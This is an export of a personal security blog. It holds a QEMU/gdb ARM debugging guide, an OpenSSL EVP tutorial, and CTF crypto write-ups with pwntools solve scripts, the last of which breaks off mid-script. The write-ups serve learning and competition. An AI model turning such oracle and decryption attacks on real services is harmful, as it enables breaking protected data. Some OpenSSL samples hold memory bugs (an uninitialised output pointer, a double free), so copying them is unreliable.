[{"content":"\r迁移 # https://slash-clavicle-dbb.notion.site/Shared-073326638a86449c9a06d6467fed470f\n","date":"11 February 2023","permalink":"/achieve/to_noiton/","section":"archive","summary":"","title":"迁移"},{"content":"\rdisplay cabinet. # ","date":"9 August 2023","permalink":"/","section":"","summary":"display cabinet.","title":""},{"content":"","date":"9 August 2023","permalink":"/tags/bin/","section":"Tags","summary":"","title":"bin"},{"content":"","date":"9 August 2023","permalink":"/categories/","section":"Categories","summary":"","title":"Categories"},{"content":"","date":"9 August 2023","permalink":"/categories/posts/","section":"Categories","summary":"","title":"posts"},{"content":"This section contains all my current projects.\n","date":"9 August 2023","permalink":"/articles/","section":"Projects","summary":"This section contains all my current projects.","title":"Projects"},{"content":" 算是了却了大二入门kernel pwn未果的心结\nUbuntu 20 qume7.2.4 源码安装qemu # apt intsall版本太低\nhttps://www.qemu.org/download/\nwget https://download.qemu.org/qemu-7.2.4.tar.xz tar xvJf qemu-7.2.4.tar.xz cd qemu-7.2.4 ./configure sudo make -j8 # 多核编译 sudo make insatll 中间缺什么apt直接装就是\nmake install 可能会环境变量添加失败，无所谓，直接如下运行\nsudo /usr/local/test/bin/qemu-aarch64 安装mips amd64所需的libc（瞎装一通）\n在/user下应该能找到交叉编译所需要的库\nqemu\nljahum@ljahum-vm ~/D/test\u0026gt; ls /usr/ aarch64-linux-gnu/ include/ lib64/ local/ sbin/ bin/ lib/ libexec/ mipsel-linux-gnu/ share/ games/ lib32/ libx32/ mips-linux-gnu/ src/ ljahum@ljahum-vm ~/D/test\u0026gt; ls /usr/aarch64-linux-gnu/ bin/ include/ lib/ ljahum@ljahum-vm ~/D/test\u0026gt; 编译运行 # 写个玩具\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; int main(){ printf(\u0026#34;hello world\\ninput ur emotion\\n\u0026#34;); char str[200]; scanf(\u0026#34;%s\u0026#34;,str); printf(\u0026#34;u say : %s\\n\u0026#34;,str); if(!strcmp(str,\u0026#34;hello\u0026#34;)){ printf(\u0026#34;you good\\n\u0026#34;); } else if(!strcmp(str , \u0026#34;end\u0026#34;)){ printf(\u0026#34;you bad\\n\u0026#34;); } // printf(\u0026#34;end\\n\u0026#34;); return 0; } aarch64-linux-gnu-gcc ./main.c -o amd64out -static\n运行\nljahum@ljahum-vm ~/D/test\u0026gt; ls /usr/aarch64-linux-gnu/ bin/ include/ lib/ ljahum@ljahum-vm ~/D/test\u0026gt; qemu-aarch64 amd64out hello world input ur emotion hello u say : hello you good ljahum@ljahum-vm ~/D/test\u0026gt; file amd64out amd64out: ELF 64-bit LSB executable, ARM aarch64, version 1 (GNU/Linux), statically linked, BuildID[sha1]=84b60fe12f86c039ffcd221a4e32a1c766677293, for GNU/Linux 3.7.0, not stripped ljahum@ljahum-vm ~/D/test\u0026gt; qemu用户模式调试 # 先安装gdb-multiarch\nsudo apt install gdb-multiarch\nqemu启动脚本\n-L 指定动态连接库位置 此时用于是静态链接 所以可加可不加\n-g指定 挂载端口\nqemurun.sh\n#!/bin/bash sudo /usr/local/test/bin/qemu-aarch64 \\ -L /usr/aarch64-linux-gnu/ \\ -g 1234 \\ ./amd64out gdb启动脚本\ngdbrun.sh\n#!/bin/bash gdb-multiarch -q ./amd64out -x dbgscript gdb-multiarch 行内命令脚本\ndbgscript:\n#dbgscript set architecture aarch64 b main target remote 127.0.0.1:1234 c 先运行qemu启动脚本\nljahum@ljahum-vm ~/D/test\u0026gt; sudo ./qemurun.sh hello world input ur emotion end u say : end 再运行gdb启动脚本\nljahum@ljahum-vm ~/D/test\u0026gt; sudo ./gdbrun.sh pwndbg: loaded 147 pwndbg commands and 46 shell commands. Type pwndbg [--shell | --all] [filter] for a list. pwndbg: created $rebase, $ida GDB functions (can be used with print/break) Reading symbols from ./amd64out... (No debugging symbols found in ./amd64out) The target architecture is assumed to be aarch64 Breakpoint 1 at 0x928 warning: remote target does not support file transfer, attempting to access files from local filesystem. 0x0000005502814100 in ?? () from /lib/ld-linux-aarch64.so.1 warning: Could not load shared library symbols for /lib/libc.so.6. Do you need \u0026#34;set solib-search-path\u0026#34; or \u0026#34;set sysroot\u0026#34;? Breakpoint 1, 0x0000005500000928 in main () ------- tip of the day (disable with set show-tips off) ------- Want to NOP some instructions? Use patch \u0026lt;address\u0026gt; \u0026#39;nop; nop; nop\u0026#39; LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA ────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────── *X0 0x5500010000 ◂— 0x10102464c457f *X1 0x5502812568 —▸ 0x550281279f ◂— \u0026#39;./amd64out-lib\u0026#39; *X2 0x5502812578 —▸ 0x55028127ae ◂— \u0026#39;SUDO_GID=0\u0026#39; *X3 0x550000091c (main) ◂— stp x29, x30, [sp, #-0xe0]! X4 0x0 *X5 0xb25a824f20c39041 *X6 0x55029c8b10 ◂— 0x0 *X7 0x1 *X8 0xffffffffffffffff *X9 0xfffffff X10 0x0 X11 0x0 *X12 0x550285ce48 ◂— 0x0 X13 0x0 X14 0x0 *X15 0x6fffff47 *X16 0x1 *X17 0x5502879d28 ◂— 0xb0000a64a9ab7bfd *X18 0x73516240 *X19 0x55000009f8 (__libc_csu_init) ◂— stp x29, x30, [sp, #-0x40]! X20 0x0 *X21 0x5500000810 (_start) ◂— mov x29, #0 X22 0x0 X23 0x0 X24 0x0 X25 0x0 X26 0x0 X27 0x0 X28 0x0 *X29 0x5502812330 —▸ 0x5502812410 ◂— 0x0 *X30 0x5502879e10 ◂— 0xf9402fe0940055f4 *SP 0x5502812330 —▸ 0x5502812410 ◂— 0x0 *PC 0x5500000928 (main+12) ◂— ldr x0, [x0, #0xfe0] ─────────────────────[ DISASM / aarch64 / set emulate on ]───────────────────── ► 0x5500000928 \u0026lt;main+12\u0026gt; ldr x0, [x0, #0xfe0] 0x550000092c \u0026lt;main+16\u0026gt; ldr x1, [x0] 0x5500000930 \u0026lt;main+20\u0026gt; str x1, [sp, #0xd8] 0x5500000934 \u0026lt;main+24\u0026gt; mov x1, #0 0x5500000938 \u0026lt;main+28\u0026gt; adrp x0, #0x5500000000 0x550000093c \u0026lt;main+32\u0026gt; add x0, x0, #0xa98 0x5500000940 \u0026lt;main+36\u0026gt; bl #puts@plt \u0026lt;puts@plt\u0026gt; 0x5500000944 \u0026lt;main+40\u0026gt; add x0, sp, #0x10 0x5500000948 \u0026lt;main+44\u0026gt; mov x1, x0 0x550000094c \u0026lt;main+48\u0026gt; adrp x0, #0x5500000000 0x5500000950 \u0026lt;main+52\u0026gt; add x0, x0, #0xab8 ───────────────────────────────────[ STACK ]─────────────────────────────────── 00:0000│ x29 sp 0x5502812330 —▸ 0x5502812410 ◂— 0x0 01:0008│ 0x5502812338 —▸ 0x5502879e10 ◂— 0xf9402fe0940055f4 02:0010│ 0x5502812340 ◂— 0x0 03:0018│ 0x5502812348 ◂— 0xffffffff 04:0020│ 0x5502812350 ◂— 0x0 05:0028│ 0x5502812358 —▸ 0x55028678b8 ◂— 0xc001200005b6e /* \u0026#39;n[\u0026#39; */ 06:0030│ 0x5502812360 —▸ 0x5502846a00 —▸ 0x5502859000 ◂— 0x3010102464c457f 07:0038│ 0x5502812368 ◂— 0x0 ─────────────────────────────────[ BACKTRACE ]───────────────────────────────── ► 0 0x5500000928 main+12 ─────────────────────────────────────────────────────────────────────────────── pwndbg\u0026gt; 按 n 单步开调\n调试动态链接文件 # 不添加 -static 编译\naarch64-linux-gnu-gcc ./main.c -o amd64out-lib\n此时需要 -L 指定 /libs 目录的位置\n#!/bin/bash sudo /usr/local/test/bin/qemu-aarch64 \\ -L /usr/aarch64-linux-gnu/ \\ ./amd64out-lib ljahum@ljahum-vm ~/D/test\u0026gt; sudo ./qemurun.sh hello world input ur emotion hello u say : hello you good 系统模式 # TO DO\n模拟运行ARM64架构内核 # 本来想做个aarch64跑系统模式 没想到翻到了内核的文章\nhttps://blog.csdn.net/weixin_39541632/category_9432131.html\n容易出错的点：\n挂载 # $ mkdir -p tmpfs $ sudo mount -t ext4 linux_rootfs.ext4 tmpfs/ -o loop $ sudo cp -af linux_rootfs/* tmpfs/ $ sudo umount tmpfs $ sudo chmod 777 linux_rootfs.ext4 挂载拷贝在 /root 下进行\nqemu aarch64启动命令写到 run.sh里面 给予权限后运行\nsudo chmod 777 ./* sudo ./run.sh 用户名默认root 交叉编译 strace 并安装 # 在root下clone strace\nroot@ljahum-vm:~# ls ./strace/ aclocal.m4 config.status LGPL-2.1-or-later README-hacking attic configure m4 README.md AUTHORS configure.ac maint src autom4te.cache COPYING Makefile strace.spec bootstrap CREDITS.in Makefile.am strace.spec.in build-aux debian Makefile.in strace.svg bundled dist NEWS tests ChangeLog-CVS doc README tests-m32 ci INSTALL README-configure tests-mx32 config.log INSTALL-git.md README-github_gitlab-autogenerated-archives.txt tmp.sh root@ljahum-vm:~# pwd /root root@ljahum-vm:~# 在/root 下解压gdb\n解压gdb8的命令\n在make前的\n./configure --host=aarch64-linux-gnu --target=aarch64-linux-gnu --program-prefix=aarch64-linux- \\ --prefix=/home/jiaming/Documents/jailhouse-rpi4/qemu-arm64/gdb-8.0/gdb-build 可以把\u0026ndash;prefix后面的目标目录换成自己user的目录\nmake error # 如果make install出现了\nhttps://blog.csdn.net/weixin_44602409/article/details/115716913\n的bug1\n修改以下文件\nroot@ljahum-vm:~/gdb-8.0# ls -l ./gdb/nat/linux-ptrace.* -rw-rw-rw- 1 ljahum 200 18011 8月 10 22:58 ./gdb/nat/linux-ptrace.c -rw-rw-rw- 1 ljahum 200 7709 8月 10 22:59 ./gdb/nat/linux-ptrace.h root@ljahum-vm:~/gdb-8.0# pwd /root/gdb-8.0 root@ljahum-vm:~/gdb-8.0# linux-ptrace.c\n注释掉\nlinux-ptrace.h\n加入\n重新make -j8\n再make install\nmakeinfo not found # sudo apt-get install texinfo\nmakeinfo没有安装的错误\n运行 # 编写gdb启动脚本\n编写qemu启动脚本\nroot@ljahum-vm:~# vim rungdb.sh root@ljahum-vm:~# vim dbgscript root@ljahum-vm:~# chmod 777 ./* root@ljahum-vm:~# cat run rungdb.sh run.sh root@ljahum-vm:~# cat rungdb.sh #!/bin/bash aarch64-linux-gdb ./linux-4.14.221/vmlinux -x dbgscript root@ljahum-vm:~# cat dbgscript target remote localhost:1234 root@ljahum-vm:~# cat run rungdb.sh run.sh root@ljahum-vm:~# cat run rungdb.sh run.sh root@ljahum-vm:~# cat run.sh /usr/local/test/bin/qemu-system-aarch64 \\ -m 1024 \\ -cpu cortex-a57 \\ -M virt -nographic \\ -smp 4 \\ -kernel linux-4.14.221/arch/arm64/boot/Image \\ -append \u0026#34;noinintrd sched_debug root=/dev/vda rootfstype=ext4 rw crashkernel=256M loglevel=8\u0026#34; \\ -drive if=none,file=linux_rootfs.ext4,id=hd0 \\ -device virtio-blk-device,drive=hd0 \\ -S -s root@ljahum-vm:~# 先运行qemu再运行gdb\n看起来非常上流\n会看镜像的成色\n完全符合我对Cortex-A57芯片的想象\nroot@lja-PC:~# lscpu Architecture: aarch64 Byte Order: Little Endian CPU(s): 4 On-line CPU(s) list: 0-3 Thread(s) per core: 1 Core(s) per socket: 4 Socket(s): 1 NUMA node(s): 1 Vendor ID: ARM Model: 0 Model name: Cortex-A57 Stepping: r1p0 BogoMIPS: 125.00 NUMA node0 CPU(s): 0-3 Flags: fp asimd evtstrm aes pmull sha1 sha2 crc32 cpuid root@lja-PC:~# ifconfig enp0s1: flags=4163\u0026lt;UP,BROADCAST,RUNNING,MULTICAST\u0026gt; mtu 1500 ether 52:54:00:12:34:56 txqueuelen 1000 (Ethernet) RX packets 0 bytes 0 (0.0 B) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 0 bytes 0 (0.0 B) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 lo: flags=73\u0026lt;UP,LOOPBACK,RUNNING\u0026gt; mtu 65536 inet 127.0.0.1 netmask 255.0.0.0 loop txqueuelen 1000 (Local Loopback) RX packets 2088 bytes 204552 (199.7 KiB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 2088 bytes 204552 (199.7 KiB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 root@lja-PC:~# 可以给网卡配置和虚拟机同网段的ip来传文件（但看起来不需要）\n","date":"9 August 2023","permalink":"/articles/qemu021/","section":"Projects","summary":"算是了却了大二入门kernel pwn未果的心结","title":"qemu from zero 2 hero"},{"content":"","date":"9 August 2023","permalink":"/tags/","section":"Tags","summary":"","title":"Tags"},{"content":"","date":"30 July 2023","permalink":"/categories/2023/","section":"Categories","summary":"","title":"2023"},{"content":"","date":"30 July 2023","permalink":"/tags/development/","section":"Tags","summary":"","title":"Development"},{"content":"\rabout # 123123 id：ljahum\r@Syclover\n随缘排序\n如果你喜欢嘉然,哪我们就是异父异母的好兄弟\nprint(代码测试) \\(123123\\)\n$123$\n$$ 123123 $$\nIntroduction (TL;DR) # Authenticated encryption (AE) is a term used to describe encryption systems that simultaneously protect confidentiality and authenticity (integrity) of communications; that is, AE provides both message encryption and message authentication of a plaintext block or message .\nThe offset codebook block cipher mode (OCB)\nOCB provide an extremely efficient algorithm, equal to or more efficient than other AE algorithms. OCB is a cipher mode and we can apply ocb to AES/DES/SM4 etc.\nThe following paragraph briefly introduces OCB1 and OCB2\nOCB1 # Figure 1 shows the overall structure for OCB encryption and authentication.\nThe message M to be encrypted and authenticated is divided into n-bit blocks, with the exception of the last block, which may be less than n bits. Typically, n = 128.\nenc\nInput:$(N,M)$\nOutput:$(C,T)$\n\\(123123\\)\n$$ sdfasdfasd $$\n一个船新的站\n","date":"30 July 2023","permalink":"/articles/cntest/","section":"Projects","summary":"about # 123123 id：ljahum\r@Syclover","title":"中文测试 中文測試 Chinese test"},{"content":"\rInfo # 「以前の名前はljahumですが、ベーコンとも呼んでください。」\nLinux Binary \u0026amp;\u0026amp; Development Cryptography\nRarely like a postgraduate studying Coding/Security technology\nProbably a guitarist more\nheading on a dim way\ncontact me:\n1695325350 roomoflja@gmail.com ","date":"20 July 2023","permalink":"/about/","section":"","summary":"Info # 「以前の名前はljahumですが、ベーコンとも呼んでください。」","title":"About"},{"content":"","date":"20 July 2023","permalink":"/categories/categories1/","section":"Categories","summary":"","title":"categories1"},{"content":"This section contains all I wrote in 2019-2023\n","date":"15 February 2023","permalink":"/achieve/","section":"archive","summary":"This section contains all I wrote in 2019-2023","title":"archive"},{"content":"","date":"15 February 2023","permalink":"/tags/codes/","section":"Tags","summary":"","title":"codes"},{"content":"\r简介 # EVP系列的函数的声明包含在evp.h里面 封装了openssl加密库里面所有算法的函数。通过这样的统一的封装，使得只需要在初始化参数的时候做很少的改变，就可以使用相同的代码调用不同的加密算法\nctx上下文可以被认为是配置选项生效的“范围”。\n加载提供者时，它仅在给定库上下文的范围内加载。\n通过这种方式，复杂应用程序的不同组件可以各自使用不同的库上下文，并让不同的提供程序加载不同的配置设置。\n主要模块\n摘要 EVP_MD\n对称密码 EVP_CIPHER\n消息验证码 EVP_MAC\n密钥派生函数 EVP_KDF\n密钥交换 EVP_KEYEXCH\n非对称密码 EVP_ASYM_CIPHER\n公钥密码(相比对称强调秘钥和算法) EVP_PKEY_CTX\n非对称密钥封装 EVP_KEM\n编码 OSSL_ENCODER\nopenssl安装 # scoop install openssl 查看环境变量\nget-ChildItem env: ... OPENSSL_CONF D:\\Scoop\\apps\\openssl\\current\\bin\\cnf\\openssl.cnf OPENSSL_INCLUDE_DIR D:\\Scoop\\apps\\openssl\\current\\include OPENSSL_LIB_DIR D:\\Scoop\\apps\\openssl\\current\\lib OPENSSL_MODULES D:\\Scoop\\apps\\openssl\\current\\bin makefile配置(clion)\n#cmake_minimum_required(VERSION 3.24) cmake_minimum_required(VERSION 3.17) project(openssl1 C) set(CMAKE_C_STANDARD 99) set(LINK_DIR $ENV{OPENSSL_LIB_DIR}) set(INC_DIR \u0026#34;D:\\\\Scoop\\\\apps\\\\openssl\\\\current\\\\include\u0026#34;) # 手动配路径的方法 #include_directories($ENV{OPENSSL_INCLUDE_DIR}) 从系统读路径的方法 include_directories(${INC_DIR}) #link_directories($ENV{OPENSSL_LIB_DIR}) link_directories(${LINK_DIR}) link_libraries(openssl libcrypto) add_executable(openssl1 publicKeyEnc.c)#这里add的文件只能有一个main target_link_libraries(openssl1 openssl) openssl evp 摘要算法 # new一个md ctx ctx初始化 指定摘要类型的初始化 对消息多次摘要 摘要结束 输出结果 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026#34;openssl/evp.h\u0026#34; void test_md5(unsigned char * msg,unsigned char * output){ printf(\u0026#34;start test MD digest\\n\u0026#34;); char * msg1 = msg; unsigned char md_value[EVP_MAX_MD_SIZE]; unsigned int md_len; EVP_MD_CTX *pmdctx = EVP_MD_CTX_new(); EVP_MD_CTX_init(pmdctx); EVP_DigestInit(pmdctx,EVP_md5()); //该函数功能跟EVP_DigestInit_ex函数同样，可是ctx?数能够不用初始化，并且该函数仅仅使用缺省实现的算法。 EVP_DigestUpdate(pmdctx,msg1, strlen(msg1)); EVP_DigestFinal(pmdctx,md_value,\u0026amp;md_len); md_value[md_len]= (unsigned char) \u0026#39;\\0\u0026#39;;//加0截断 //返回参数 strcpy(output,md_value); output[strlen(md_value)] = (unsigned char) \u0026#39;\\0\u0026#39;; EVP_MD_CTX_free(pmdctx); //该函数功能跟EVP_DigestFinal_ex函数同样，可是ctx结构会自己主动清除。一般来说，如今新的程序应该使用EVP_DigestInit_ex和EVP_DigestFinal_ex函数 } void test_sm3(){ printf(\u0026#34;start test SM3 digest\\n\u0026#34;); unsigned char md_value[EVP_MAX_MD_SIZE]; //保存输出的摘要值的数组 unsigned int md_len; EVP_MD_CTX *pmdctx = EVP_MD_CTX_new(); //EVP消息结构体 char msg1[] = \u0026#34;Test Message1\u0026#34;; //待计算摘要的消息1 char msg2[] = \u0026#34;Test Message2\u0026#34;; //待计算只要的消息2 int i=0; EVP_MD_CTX_init(pmdctx); //初始化摘要结构体 //设置摘要算法和密码算法引擎，这里密码算法使用SM3 //算法引擎使用OpenSSL默认引擎，即软算法 EVP_DigestInit_ex(pmdctx,EVP_sm3(),NULL); EVP_DigestUpdate(pmdctx,msg1,strlen(msg1)); //调用摘要Update计算msg1的摘要 EVP_DigestUpdate(pmdctx,msg2,strlen(msg2)); //调用摘要Update计算msg2的摘要 EVP_DigestFinal_ex(pmdctx,md_value,\u0026amp;md_len); //摘要结束，输出摘要值 /* 打印结果 */ printf(\u0026#34;msgis: %s %s：\\n\u0026#34;,msg1,msg2); for(i=0;i\u0026lt;md_len;i++) { printf(\u0026#34;%02X\u0026#34;,md_value[i]); } printf(\u0026#34;\\n\u0026#34;); EVP_MD_CTX_free(pmdctx); } int main() { printf(\u0026#34;Hello, OpenSSL!\\n\u0026#34;); /* 加载所有算法 */ // OpenSSL_add_all_algorithms(); test_sm3(); //MD5 unsigned char msg1[] = \u0026#34;hello world\u0026#34;; unsigned char * output; test_md5(msg1,output); printf(\u0026#34;MD5(\\\u0026#34;%s\\\u0026#34;)=\u0026#34;,msg1); for (int i = 0; i \u0026lt; strlen(output); ++i) { printf(\u0026#34;%02X\u0026#34;,output[i]); } return 0; } openssl RSA密钥对生成模板 # #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;openssl/evp.h\u0026gt; #include \u0026#34;openssl/rsa.h\u0026#34; void Test_Rsa(){ /*1.new一个公钥ctx对象 指定加密算法类型 * 2.对其初始化 * 3.设置rsa参数 * 4.正式生成密钥 * 5.释放ctx * */ printf(\u0026#34;hello RSA\\n\u0026#34;); EVP_PKEY * Rsa_Pkey=NULL; EVP_PKEY_CTX *Rsa_ctx = EVP_PKEY_CTX_new_id(EVP_PKEY_RSA,NULL); EVP_PKEY_keygen_init(Rsa_ctx); //前两步均在初始化 （不能合到一起吗） //EVP_PKEY_CTX_new() 函数使用pkey密钥类型和 ENGINE e分配公钥算法上下文。 // //EVP_PKEY_CTX_new_id() 函数使用id和 ENGINE e指定的密钥类型分配公钥算法上下文 EVP_PKEY_CTX_set_rsa_keygen_bits(Rsa_ctx,1024); EVP_PKEY_keygen(Rsa_ctx,\u0026amp;Rsa_Pkey); EVP_PKEY_CTX_free(Rsa_ctx); BIGNUM *d=0; // BIGNUM *e=0; // BIGNUM *n=0; EVP_PKEY_get_bn_param(Rsa_Pkey,\u0026#34;d\u0026#34;,\u0026amp;d); // EVP_PKEY_get_bn_param(Rsa_Pkey,\u0026#34;e\u0026#34;,\u0026amp;e); // EVP_PKEY_get_bn_param(Rsa_Pkey,\u0026#34;n\u0026#34;,\u0026amp;n); char *Hex_d; Hex_d = BN_bn2hex(d);//大数转化为十六进制字符串 // BN_bn2dec() 十进制 printf(\u0026#34; rsa私钥长度=%dbits 私钥十六进制形式:\\n\u0026#34;,strlen(Hex_d)*4); printf(\u0026#34;\\n\u0026#34;); for (int i = 0; i \u0026lt; strlen(Hex_d); ++i) { printf(\u0026#34;%C\u0026#34;,Hex_d[i]); } printf(\u0026#34;\\n\u0026#34;); EVP_PKEY_CTX_free(Rsa_ctx); //释放ctx } int main(){ Test_Rsa(); return 0; } openssl 对称密码模板 aesecb # // // Created by 16953 on 2023/2/14. // #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;openssl/evp.h\u0026gt; #include \u0026lt;openssl/aes.h\u0026gt; int main(void) { /* * 1. new aesctx * 2.initex * 3.update * 4.final * 5.free * */ unsigned char key[32] = {1}; unsigned char iv[16] = {0}; unsigned char *inStr = \u0026#34;this is test string\u0026#34;; int inLen = strlen(inStr); int encLen = 0; int outlen = 0; unsigned char encData[1024]; printf(\u0026#34;source: %s\\n\u0026#34;,inStr); //加密 EVP_CIPHER_CTX *ctx= EVP_CIPHER_CTX_new(); // ctx = EVP_CIPHER_CTX_new(); EVP_CipherInit_ex(ctx, EVP_aes_256_ecb(), NULL, key, iv, 1); EVP_CipherUpdate(ctx, encData, \u0026amp;outlen, inStr, inLen); encLen = outlen; EVP_CipherFinal(ctx, encData+outlen, \u0026amp;outlen); encLen += outlen; EVP_CIPHER_CTX_free(ctx); //解密 int decLen = 0; outlen = 0; unsigned char decData[1024]; EVP_CIPHER_CTX *ctx2= EVP_CIPHER_CTX_new(); EVP_CipherInit_ex(ctx2, EVP_aes_256_ecb(), NULL, key, iv, 0); EVP_CipherUpdate(ctx2, decData, \u0026amp;outlen, encData, encLen); decLen = outlen; EVP_CipherFinal(ctx2, decData+outlen, \u0026amp;outlen); decLen += outlen; EVP_CIPHER_CTX_free(ctx2); decData[decLen] = \u0026#39;\\0\u0026#39;; printf(\u0026#34;decrypt: %s\\n\u0026#34;,decData); } EVP_对底层接口进行了封装,但对初学者和对密码体系了解不到位的同学来说会比直接调用低级接口抽象许多\n在调用细节上加强对资源销毁(EVP_FREE)的重视\n","date":"15 February 2023","permalink":"/achieve/openssl_evp/","section":"archive","summary":"","title":"OpenSSL 调用EVP框架 几种加密模式"},{"content":"","date":"11 February 2023","permalink":"/tags/nuil/","section":"Tags","summary":"","title":"Nuil"},{"content":"","date":"11 February 2023","permalink":"/categories/%E5%85%B6%E4%BB%96/","section":"Categories","summary":"","title":"其他"},{"content":"","date":"14 November 2021","permalink":"/tags/crypto/","section":"Tags","summary":"","title":"crypto"},{"content":"","date":"14 November 2021","permalink":"/categories/ctf/","section":"Categories","summary":"","title":"CTF"},{"content":"","date":"14 November 2021","permalink":"/tags/math/","section":"Tags","summary":"","title":"math"},{"content":"\r祥云ber secret_share # 下午来推了一半就出去吃东西去了😘😘\n看了wp发现只要几个步骤串起来其实不难的，可能是因为我只会炼丹吧。。。\n基本加解密：\nenc\n$E = g^e\\mod p,V=g^v\\mod p\\ s = v+e(h2(E||V))$\n$c = m*pk^{e+v}\\mod p$\nr_enc:\n$E_- = g^{e\\times skI\\times dd} , V_-=g^{v\\times skI\\times dd}$\n$E = g^{e},V=g^{v}$\n$c = m\\times (EV)^{skI}\\mod p =m\\times (E_-V_-)^{inv(dd,p-1)}\\mod p$\n这里拿到dd就可以搞解密了，解dd的前提是吧encoder搞清楚\nencoder当时没细看，其实变化写完了一看就很简单了\n照着👴们的消元学习了\n连续4次推得sk拿到随机出来的m可以得到\n$mul={sk}^4\\cdot dd_1\\cdot dd_2\\cdot dd_3\\cdot dd_4%p$\n$dd_i$是已知的,有些solve是域下开根\n有些是神仙炫技直接 韦达定理 或者 费玛大定理\n拿到单独的sk后就可以搞事情了\nEV都是已知，c也已知 直接算就🆗了\nsolve-step1\nfrom Crypto.Util.number import * from icecream import * from hashlib import sha256 from gmpy2 import * import libnum from pwn import * from libnum import * def h2(m): return int(sha256(m).hexdigest(), 16) io=remote(\u0026#39;0.0.0.0\u0026#39;,10001) #1 io.recvuntil(\u0026#39;choice\u0026gt;\u0026#39;) io.sendline(\u0026#39;1\u0026#39;) io.recvuntil(\u0026#39;Please take good care of it!\\n\u0026#39;) pk_sk=io.recvuntil(\u0026#39;\\n\u0026#39;)[:-1].decode()[2:-1].split(\u0026#39;L,0x\u0026#39;) pk,sk=int(pk_sk[0],16),int(pk_sk[1],16) #2 io.recvuntil(\u0026#39;choice\u0026gt;\u0026#39;) io.sendline(\u0026#39;2\u0026#39;) pp, g = 0xb5655f7c97e8007baaf31716c305cf5950a935d239891c81e671c39b7b5b2544b0198a39fd13fa83830f93afb558321680713d4f6e6d7201d27256567b8f70c3, 0x85fd9ae42b57e515b7849b232fcd9575c18131235104d451eeceb991436b646d374086ca751846fdfec1ff7d4e1b9d6812355093a8227742a30361401ccc5577 group_list = [32, 64, 128, 256] DD=1 for group in group_list: io.recvuntil(\u0026#39;The cipher shared to you\\n\u0026#39;) cc=int(io.recvuntil(\u0026#39;L, \u0026#39;)[1:-3]) new_cipher=[cc] new_cipher+=eval(io.recvuntil(\u0026#39;)\\n\u0026#39;)[:-2].decode().replace(\u0026#39;L\u0026#39;,\u0026#39;\u0026#39;)) c,E_,V_,s_=new_cipher io.recvuntil(\u0026#39;prefix, encoder = \u0026#39;) Enc2,prefix=pre_enc=eval(io.recvuntil(\u0026#39;\\n\u0026#39;)[:-1].decode().replace(\u0026#39;L\u0026#39;,\u0026#39;\u0026#39;)) prefix=int(prefix,16) encoder=[1,(-pow(prefix,sk,pp)) %pp] prefix = long_to_bytes(prefix).rjust(64, b\u0026#39;\\x00\u0026#39;) ml=[1] for i in range(len(Enc2)): ml.append((ml[-1]*encoder[-1]+Enc2[i]*(-1)**(i+1))%pp) r=-ml[-1]%pp dd = h2(prefix + long_to_bytes(r).rjust(64, b\u0026#39;\\x00\u0026#39;)) | 1 DD*=dd d=libnum.invmod(dd,pp-1) tmp=E_*V_%pp xx=pow(tmp,d,pp) m=c*libnum.invmod(xx,pp)%pp io.send(hex(m)[2:]) io.recvuntil(\u0026#39;You are a clever boy! Now I can share you some other information!\\n0x\u0026#39;) mul=int(io.recvuntil(\u0026#39;\\n\u0026#39;)[:-2],16) ic(DD) ic(mul) #3 io.recvuntil(\u0026#39;choice\u0026gt;\u0026#39;) io.sendline(\u0026#39;3\u0026#39;) cc=int(io.recvuntil(\u0026#39;L, \u0026#39;)[1:-3]) cipher=[cc] cipher+=eval(io.recvuntil(\u0026#39;)\\n\u0026#39;)[:-2].decode().replace(\u0026#39;L\u0026#39;,\u0026#39;\u0026#39;)) ic(cipher) solve-step2\nfrom gmpy2 import * io=0xb5655f7c97e8007baaf31716c305cf5950a935d239891c81e671c39b7b5b2544b0198a39fd13fa83830f93afb558321680713d4f6e6d7201d27256567b8f70c3 D=15987058835088036058838351739905403758810826722245822649290306549906899936826738229650730140126509371862930340608846190807298868677166971678478129606238898364288362139315516922003581996769819030117310508402522153899137933429897987557331966070437119010259514160059698255241259153692392463260794449949596746727 mul=7194716155235037744823597029059822446255314248196377746260315999958188811928743123657567494196521690514320209430663462342437059567384744437239548754416135 c=mul*libnum.invmod(D,io)%io e=4 R.\u0026lt;x\u0026gt; = Zmod(io)[] f = x ^ e- c f = f.monic() res1 = f.roots() print(res1) solve-step3\nfrom Crypto.Util.number import * from gmpy2 import * pp=0xb5655f7c97e8007baaf31716c305cf5950a935d239891c81e671c39b7b5b2544b0198a39fd13fa83830f93afb558321680713d4f6e6d7201d27256567b8f70c3 sk=3415391405045794570454819264678842883406589094879440924771251075986414212665514615692960890299627279215019657097231396800926908716766924569917256830117771 cipher=[1452085683981538837849557434841689674477096081702343000869186835544808468459192026693029532721465657214194362000756249662047209552808256166535501585736401, 9299317806552199012103361766715291248186887467752322286719294121971787657296205598139365760833959784768412272593061318430853065277862724140493914797711689, 9287316455075844376168558534606543590293095721271733423230961724912040658757071778242087450272981713664977773510705690081763692753388091475741636185572383, 229110517869350912236518454062717456777603700368163296438479618211042488031942897036793380693680124455343059560507824269299022538059530971380675264277197] c,E,V,s=cipher xx=E*V%pp m=c*libnum.invmod(pow(xx,sk,pp),pp)%pp print(long_to_bytes(m)) #flag{504d0411-6707-469b-be31-9868200aca95} 学到很多\n蓝帽ber final # https://github.com/ljahum/crypto-challenges/tree/main/%E8%93%9D%E7%8C%AB2021/final/twoBytes\ntwobyte # 二分法\n传入$C\\times padding^e$\n利用高位的two bytes判断$M\\times padding和2^{496}$的大小关系(512-16=496)\n利用二分法查找padding的值\n查找约1000+次可以恢复secret\nsolve # from subprocess import run from Crypto.Util.number import long_to_bytes from icecream import * from pwn import * import re from pwnlib.util.iters import pad def b2s(s): if(type(s)==str): return s else: return s.decode() def CatNum(txt): txt = b2s(txt) matchObj = re.findall(r\u0026#39;[0-9]+\u0026#39;, txt) return matchObj def dec(n): print(io.recvuntil(\u0026#39;Your choice: 